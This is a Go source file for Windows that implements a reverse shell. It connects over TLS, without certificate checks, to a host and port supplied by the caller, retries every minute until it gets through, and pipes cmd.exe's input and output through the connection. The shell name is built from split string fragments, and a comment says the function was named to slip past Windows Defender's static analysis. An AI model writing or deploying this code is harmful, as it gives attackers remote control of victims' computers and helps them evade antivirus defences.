//go:build windows
// +build windows

package tacos

import (
	"crypto/tls"
	"fmt"
	"os/exec"
	"strings"
	"time"
)

//DetectDefaultShell: return the default shell
func DetectDefaultShell() string {
	shell := strings.ToLower(fmt.Sprintf("%s%s%s", "Cm", "D.e", "Xe"))
	return shell
}

//ShellReverse: spawn a reverse shell with pty targeting host (ip:port). Name ShellReverse cause ReverseShell does not pass windows defender
// static analysis
func ShellReverse(host string, shell string) {
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}
	conn, err := tls.Dial("tcp", host, conf)
	if nil != err {
		fmt.Println(err)
		if nil != conn {
			conn.Close()
		}
		time.Sleep(time.Minute)
		ShellReverse(host, shell)
	}

	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
